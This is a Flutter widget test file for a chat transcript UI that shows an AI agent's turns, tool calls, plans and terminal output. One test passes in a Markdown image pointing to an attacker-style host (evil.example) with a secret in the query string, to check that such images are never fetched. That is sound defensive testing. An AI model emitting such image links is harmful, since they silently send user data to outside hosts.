import 'package:coqui_acp_chat/coqui_acp_chat.dart';
import 'package:coqui_acp_chat_ui/coqui_acp_chat_ui.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

import 'fixtures.dart';

Widget transcript(
  List<ChatEntryData> entries, {
  ChatDensity? density,
  ChatRenderers renderers = ChatRenderers.none,
  List<PlanEntry> plan = const [],
  bool working = false,
  Map<String, TerminalView> terminals = const {},
  Key? key,
}) => host(
  SizedBox(
    width: 900,
    height: 700,
    child: ChatTranscript(key: key, entries: entries, density: density, renderers: renderers, plan: plan, working: working, terminals: terminals),
  ),
);

void main() {
  testWidgets('Normal folds a finished turn into Worked for, and opens into its burst, then its cards', (tester) async {
    await tester.pumpWidget(transcript(worked()));
    expect(find.textContaining('Worked for 40s'), findsOneWidget);
    expect(find.textContaining('Edited calc.js, ran a command'), findsOneWidget);
    expect(find.byType(ToolCard), findsNothing);
    expect(find.textContaining('I fixed'), findsOneWidget, reason: 'the answer stays');

    await tester.tap(find.textContaining('Worked for 40s'));
    await tester.pump();
    // Inside: the thought, and the burst as one line.
    expect(find.text('Thinking'), findsOneWidget);
    expect(find.byType(ToolBurst), findsOneWidget);

    await tester.tap(find.descendant(of: find.byType(ToolBurst), matching: find.byType(FoldLine)));
    await tester.pump();
    expect(find.byType(ToolCard), findsNWidgets(2));
    expect(find.text('Edit calc.js'), findsOneWidget);
  });

  testWidgets('Thinking shows the thought and one line for the burst, and Verbose a card for each tool', (tester) async {
    await tester.pumpWidget(transcript(worked(), density: ChatDensity.thinking));
    expect(find.text('Thinking'), findsOneWidget);
    expect(find.textContaining('Worked for'), findsNothing);
    expect(find.byType(ToolBurst), findsOneWidget);
    expect(find.byType(ToolCard), findsNothing);

    await tester.pumpWidget(transcript(worked(), density: ChatDensity.verbose));
    expect(find.byType(ToolBurst), findsNothing);
    expect(find.byType(ToolCard), findsNWidgets(2));
  });

  testWidgets('the look decides the density when the transcript is not told', (tester) async {
    await tester.pumpWidget(MaterialApp(
      theme: ThemeData(extensions: [ChatLook.fromScheme(const ColorScheme.dark(), density: ChatDensity.verbose)]),
      home: Scaffold(body: SizedBox(width: 900, height: 700, child: ChatTranscript(entries: worked()))),
    ));
    expect(find.byType(ToolCard), findsNWidgets(2));
  });

  testWidgets('a failed call stays open as a card while the others fold', (tester) async {
    final failed = tool('f', kind: 'execute', title: 'npm test', status: 'failed', content: [
      {'type': 'content', 'content': {'type': 'text', 'text': 'exit 1: boom'}},
    ]);
    final entries = [user('go', 0), toolEntry(tool('a', kind: 'read'), 1), toolEntry(failed, 2), agent('it failed', 3)];
    await tester.pumpWidget(transcript(entries));
    expect(find.byType(ToolBurst), findsOneWidget);
    expect(find.byType(ToolCard), findsOneWidget);
    expect(find.text('exit 1: boom'), findsOneWidget, reason: 'a failure opens by itself');
  });

  testWidgets('a turn still running keeps its tool that waits as a card', (tester) async {
    final entries = [user('go', 0), toolEntry(tool('a', kind: 'edit', title: 'Edit a.txt', status: 'pending'), 1)];
    await tester.pumpWidget(transcript(entries, working: true));
    expect(find.byType(ToolCard), findsOneWidget);
    expect(find.textContaining('Worked for'), findsNothing);
  });

  testWidgets('the plan is a live checklist at the end of the conversation', (tester) async {
    final plan = [
      const PlanEntry('Read addNumbers', PlanStatus.done),
      const PlanEntry('Change subtraction to addition', PlanStatus.running),
      const PlanEntry('Check the result', PlanStatus.pending),
    ];
    await tester.pumpWidget(transcript(worked(), plan: plan));
    expect(find.byKey(const Key('plan-checklist')), findsOneWidget);
    expect(find.text('Plan: 1 of 3'), findsOneWidget);
    expect(find.text('Check the result'), findsOneWidget);
    expect(find.byIcon(Icons.check_circle_outline), findsOneWidget);
    expect(find.byIcon(Icons.timelapse), findsOneWidget);
    expect(find.byIcon(Icons.radio_button_unchecked), findsOneWidget);
    // After the answer, not above the composer.
    expect(tester.getTopLeft(find.byKey(const Key('plan-checklist'))).dy, greaterThan(tester.getTopLeft(find.textContaining('I fixed')).dy));
  });

  testWidgets('no plan, no checklist', (tester) async {
    await tester.pumpWidget(transcript(worked()));
    expect(find.byKey(const Key('plan-checklist')), findsNothing);
  });

  testWidgets('a command a tool ran shows its output from the terminals', (tester) async {
    final view = TerminalView(limits)
      ..apply({'sessionUpdate': 'terminal_update', 'command': 'ls', 'output': {'data': 'YS50eHQK'}, 'exitStatus': {'exitCode': 2}}, limits);
    final call = tool('t', kind: 'execute', title: 'ls', content: [{'type': 'terminal', 'terminalId': 'term-1'}], status: 'failed');
    await tester.pumpWidget(transcript([user('go', 0), toolEntry(call, 1)], terminals: {'term-1': view}));
    expect(find.text(r'$ ls'), findsOneWidget);
    expect(find.text('exit 2'), findsOneWidget);
  });

  group('renderers', () {
    testWidgets('an entry renderer draws what it knows and leaves the rest', (tester) async {
      final renderers = ChatRenderers(entry: [
        (context, entry) => entry.role == MessageRole.notice && entry.text.startsWith('chart:') ? Text('CHART ${entry.text.substring(6)}') : null,
      ]);
      final entries = [
        user('hi', 0),
        ChatEntry(MessageRole.notice, 'chart:sales', at: t0),
        ChatEntry(MessageRole.notice, 'plain notice', at: t0),
      ];
      await tester.pumpWidget(transcript(entries, renderers: renderers));
      expect(find.text('CHART sales'), findsOneWidget);
      expect(find.text('plain notice'), findsOneWidget);
    });

    testWidgets('a tool renderer replaces the card of its kind only', (tester) async {
      final renderers = ChatRenderers(tool: {'delegate': (context, call) => Text('DELEGATED ${call.title}')});
      final entries = [
        user('go', 0),
        toolEntry(tool('d', kind: 'delegate', title: 'Review the diff', status: 'in_progress'), 1),
        toolEntry(tool('e', kind: 'edit', title: 'Edit x', status: 'in_progress'), 2),
      ];
      await tester.pumpWidget(transcript(entries, renderers: renderers, working: true));
      expect(find.text('DELEGATED Review the diff'), findsOneWidget);
      expect(find.byType(ToolCard), findsOneWidget);
      expect(find.text('Edit x'), findsOneWidget);
    });

    testWidgets('a block renderer draws a piece of a tool call, and the package draws the others', (tester) async {
      final renderers = ChatRenderers(block: [
        (context, call, block) => block is ToolText && block.text.startsWith('{') ? const Text('JSON VIEW') : null,
      ]);
      final call = tool('t', kind: 'fetch', title: 'GET', status: 'failed', content: [
        {'type': 'content', 'content': {'type': 'text', 'text': '{"a":1}'}},
        {'type': 'content', 'content': {'type': 'text', 'text': 'plain text'}},
      ]);
      await tester.pumpWidget(transcript([user('go', 0), toolEntry(call, 1)], renderers: renderers, density: ChatDensity.verbose));
      expect(find.text('JSON VIEW'), findsOneWidget);
      expect(find.text('plain text'), findsOneWidget);
      expect(find.text('{"a":1}'), findsNothing);
    });

    testWidgets('a burst, a work and a plan renderer replace their lines', (tester) async {
      final renderers = ChatRenderers(
        burst: (context, summary, tools, cards) => Text('BURST ${tools.length}: ${summary.text}'),
        work: (context, duration, summary, items) => Text('WORK ${duration.inSeconds}'),
        plan: (context, plan) => Text('PLAN ${plan.length}'),
      );
      await tester.pumpWidget(transcript(worked(), renderers: renderers, plan: const [PlanEntry('a', PlanStatus.pending)]));
      expect(find.text('WORK 40'), findsOneWidget);
      expect(find.text('PLAN 1'), findsOneWidget);
      await tester.pumpWidget(transcript(worked(), renderers: renderers, density: ChatDensity.thinking));
      expect(find.text('BURST 2: Edited calc.js, ran a command'), findsOneWidget);
    });

    test('merge puts the other registry first and over', () {
      final a = ChatRenderers(entry: [(c, e) => null], tool: {'x': (c, t) => const Placeholder()}, plan: (c, p) => const Placeholder());
      final b = ChatRenderers(entry: [(c, e) => null], tool: {'x': (c, t) => const Text('b'), 'y': (c, t) => const Text('y')});
      final merged = a.merge(b);
      expect(merged.entry, hasLength(2));
      expect(merged.entry.first, b.entry.first);
      expect(merged.tool.keys, containsAll(['x', 'y']));
      expect(merged.tool['x'], b.tool['x']);
      expect(merged.plan, a.plan);
    });
  });

  testWidgets('a person scrolled away is not dragged to the end, and the button brings them back', (tester) async {
    final entries = [for (var i = 0; i < 40; i++) agent('line $i', i)];
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key));
    expect(key.currentState!.following, isTrue);
    await tester.drag(find.byType(ListView), const Offset(0, 600));
    await tester.pump();
    expect(key.currentState!.following, isFalse);
    expect(find.byTooltip('Jump to latest'), findsOneWidget);
    await tester.tap(find.byTooltip('Jump to latest'));
    await tester.pump();
    await tester.pump();
    expect(key.currentState!.following, isTrue);
    expect(find.byTooltip('Jump to latest'), findsNothing);
  });

  testWidgets('Markdown from an agent fetches no image and copies a link instead of opening it', (tester) async {
    await tester.pumpWidget(host(const AgentMarkdown(text: '![the secret](https://evil.example/?d=secret) [a link](https://example.org/x)')));
    expect(find.text('[image: the secret]'), findsOneWidget);
    expect(find.byType(Image), findsNothing);
  });

  test('conversationText gives each entry by what it shows', () {
    expect(
      conversationText(worked()),
      'Fix addNumbers\n\nThinking\n\nEdit calc.js\n\nnode -e addNumbers(2,3)\n\nI fixed addNumbers in src/calc.js.',
    );
  });

  testWidgets('Select all then copy gives the whole conversation, built or not', (tester) async {
    final entries = [for (var i = 0; i < 60; i++) agent('line $i', i)];
    String? copied;
    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async {
      if (call.method == 'Clipboard.setData') copied = (call.arguments as Map)['text'] as String;
      return null;
    });
    addTearDown(() => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, null));
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key));
    await key.currentState!.selection!.copyAll();
    expect(copied, contains('line 0'));
    expect(copied, contains('line 59'));
  });
}
